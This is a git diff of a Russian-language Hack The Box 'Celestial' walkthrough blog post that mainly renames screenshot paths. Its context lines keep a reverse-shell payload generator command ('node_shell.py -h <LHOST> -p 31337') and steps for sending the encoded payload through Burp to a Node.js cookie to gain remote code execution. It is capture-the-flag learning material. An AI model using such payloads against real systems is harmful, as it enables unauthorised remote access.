@@ -14,10 +14,10 @@ published: true
 <!--cut-->
 
 {: .center-image}
-[![celestial-banner.png]({{ "/img/htb/boxes/celestial/celestial-banner.png" | relative_url }})](https://www.hackthebox.eu/home/machines/profile/130 "Hack The Box :: Celestial")
+[![banner.png]({{ "/img/htb/boxes/celestial/banner.png" | relative_url }})](https://www.hackthebox.eu/home/machines/profile/130 "Hack The Box :: Celestial")
 
 {: .center-image}
-![celestial-info.png]({{ "/img/htb/boxes/celestial/celestial-info.png" | relative_url }})
+![info.png]({{ "/img/htb/boxes/celestial/info.png" | relative_url }})
 
 * TOC
 {:toc}
@@ -81,18 +81,18 @@ Service detection performed. Please report any incorrect results at https://nmap
 ## Браузер
 Ради интереса посмотрим, что скажет браузер. При загрузке страницы в первый раз нас ждет просто сухой циничный маркер пустоты и безысходности, обличенный в жирные цифры **4**, **0**, **4**:
 
-[![celestial-port3000-browser-1.png]({{ "/img/htb/boxes/celestial/celestial-port3000-browser-1.png" | relative_url }})]({{ "/img/htb/boxes/celestial/celestial-port3000-browser-1.png" | relative_url }})
+[![port3000-browser-1.png]({{ "/img/htb/boxes/celestial/port3000-browser-1.png" | relative_url }})]({{ "/img/htb/boxes/celestial/port3000-browser-1.png" | relative_url }})
 
 Если быть настойчивее и обновить страничку, нас встретит очень ценное замечание:
 
-[![celestial-port3000-browser-2.png]({{ "/img/htb/boxes/celestial/celestial-port3000-browser-2.png" | relative_url }})]({{ "/img/htb/boxes/celestial/celestial-port3000-browser-2.png" | relative_url }})
+[![port3000-browser-2.png]({{ "/img/htb/boxes/celestial/port3000-browser-2.png" | relative_url }})]({{ "/img/htb/boxes/celestial/port3000-browser-2.png" | relative_url }})
 
 Что-то здесь не так, потому что `2 + 2 is 4`, это я точно помню... Будем смотреть на запрос.
 
 ## Burp Suite
 Перехватим запрос и посмотрим, что под капотом:
 
-[![celestial-port3000-burp-1.png]({{ "/img/htb/boxes/celestial/celestial-port3000-burp-1.png" | relative_url }})]({{ "/img/htb/boxes/celestial/celestial-port3000-burp-1.png" | relative_url }})
+[![port3000-burp-1.png]({{ "/img/htb/boxes/celestial/port3000-burp-1.png" | relative_url }})]({{ "/img/htb/boxes/celestial/port3000-burp-1.png" | relative_url }})
 
 Cookie с профилем. Это объясняет, почему в первый раз пришло сообщение об ошибке (первый запрос был без печенек). Посмотрим, что представляет из себя значение профиля:
 ```text
@@ -154,7 +154,7 @@ root@kali:~# python node_shell.py -h <LHOST> -p 31337 -r -e -o
 
 Переводим в base64 и отправляем в Burp (не забыв при этом поднять слушателя на фоне на 31337 порт):
 
-[![celestial-port3000-burp-2.png]({{ "/img/htb/boxes/celestial/celestial-port3000-burp-2.png" | relative_url }})]({{ "/img/htb/boxes/celestial/celestial-port3000-burp-2.png" | relative_url }})
+[![port3000-burp-2.png]({{ "/img/htb/boxes/celestial/port3000-burp-2.png" | relative_url }})]({{ "/img/htb/boxes/celestial/port3000-burp-2.png" | relative_url }})
 
 # Внутри машины
 А тем временем:
@@ -442,10 +442,10 @@ Web RCE ⟶ Reverse shell ⟶ LPE до user'а ⟶ LPE до root'а
 Здесь даже пропущено одно звено, т. к. первичный уязвимый сервис — фреймворк web-приложений, запущенный с привилегиями пользователя. Не то, что бы такие машины были плохими, вовсе нет. Просто будь готов, что достаточно скоро боксы, выстроенные по такой схеме, станут тебе скучны :unamused:
 
 {: .center-image}
-![celestial-owned-user.png]({{ "/img/htb/boxes/celestial/celestial-owned-user.png" | relative_url }})
+![owned-user.png]({{ "/img/htb/boxes/celestial/owned-user.png" | relative_url }})
 
 {: .center-image}
-![celestial-owned-root.png]({{ "/img/htb/boxes/celestial/celestial-owned-root.png" | relative_url }})
+![owned-root.png]({{ "/img/htb/boxes/celestial/owned-root.png" | relative_url }})
 
 {: .center-image}
-![celestial-trophy.png]({{ "/img/htb/boxes/celestial/celestial-trophy.png" | relative_url }})
+![trophy.png]({{ "/img/htb/boxes/celestial/trophy.png" | relative_url }})
